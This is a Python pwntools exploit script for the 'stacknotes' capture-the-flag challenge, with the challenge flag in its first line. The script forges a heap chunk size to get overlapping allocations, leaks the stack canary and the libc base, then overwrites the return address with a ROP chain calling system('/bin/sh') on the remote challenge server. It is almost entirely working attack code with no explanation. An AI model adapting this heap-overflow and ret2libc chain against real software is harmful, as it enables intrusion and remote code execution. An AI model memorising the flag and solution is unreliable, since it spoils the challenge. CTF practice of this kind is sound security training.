# idek{b3_c4r3ful_wh4t_u_fr33_and_pl34s3_r0und_c4r3fully!}
from pwn import *

elf = ELF("./stacknotes")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

target = elf.process()
target = remote("stacknotes.chal.idek.team", 1337)

def sa(s, d):
    target.sendafter(s, str(d))

def sla(s, d):
    target.sendlineafter(s, str(d))

def create(idx, size):
    sla(">", "c")
    sla("?", idx)
    sla("?", size)

def write(idx, contents):
    sla(">", "w")
    sla("?", idx)
    sa(":", contents)

def view(idx):
    sla(">", "v")
    sla("view", idx)

def delete(idx):
    sla(">", "d")
    sla("?", idx)

def exit():
    sla(">", "e")

create(0, 0x27)
create(1, 0x2f)
write(1, "B"*0x28 + p64(0x301)[:7])
delete(0)

create(2, 0x2f0)
write(2, "A"*0x30 + "a"*8)

view(2)
target.recvuntil("a"*8)
canary = u64(target.recv(8))
target.recv(8)
libc.address = u64(target.recv(8)) - libc.sym['__libc_start_main'] - 243

rop  = p64(libc.address + 0x0000000000026b73)   # ret for stack alignment
rop += p64(libc.address + 0x0000000000026b72)   # pop rdi ; ret
rop += p64(libc.search("/bin/sh\x00").next())
rop += p64(libc.sym['system'])
write(2, "A"*0x38 + p64(canary) + p64(0) + rop)

exit()

target.interactive()